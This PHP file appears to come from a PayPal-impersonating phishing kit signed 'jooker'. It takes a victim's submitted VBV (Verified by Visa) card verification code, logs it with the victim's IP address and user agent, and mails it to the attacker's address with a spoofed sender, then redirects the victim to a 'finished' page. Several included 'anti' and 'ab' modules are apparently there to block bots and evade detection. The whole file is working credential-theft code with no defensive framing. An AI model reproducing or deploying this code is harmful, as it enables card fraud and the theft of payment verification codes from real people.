<?php
error_reporting(0);
ob_start();

session_start();

include '../../prevents/anti1.php';

include '../../prevents/anti2.php';

include '../../prevents/anti3.php';

include '../../prevents/anti4.php';

include '../../prevents/anti5.php';

include '../../prevents/anti6.php';

include '../../prevents/anti7.php';

include '../../prevents/anti8.php';

include '../../monsterab/ab.php';

include '../../algorythm/mail.php';
include '../../algorythm/wanted_options.php';
if(isset($_POST['code_vbv'])){
$_SESSION['vbv_code'] = $_POST['code_vbv'];
$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
$msg = "
🃏 jooker Rez 「 Nouveau Paypal 」 🃏
[🍾] CODE : ".$_SESSION['vbv_code']."
+=========INFOS=========+
[📡] Adresse IP : ".$_SESSION['ip']."
[📶] User Agent : ".$_SERVER['HTTP_USER_AGENT']."
🃏 jooker 🃏
";
$subject = "🍾 +1 VBV " .$_SESSION['ip']." - ". $_SESSION['vbv_code'] . "🍾" ;
$fromsender = "From: 🃏 jooker 🃏 <log@rezappl.com>";
mail($rezmail,$subject,$msg,$fromsender);
$_SESSION['finished'] = true;
header('location: ../finished/');
}
?>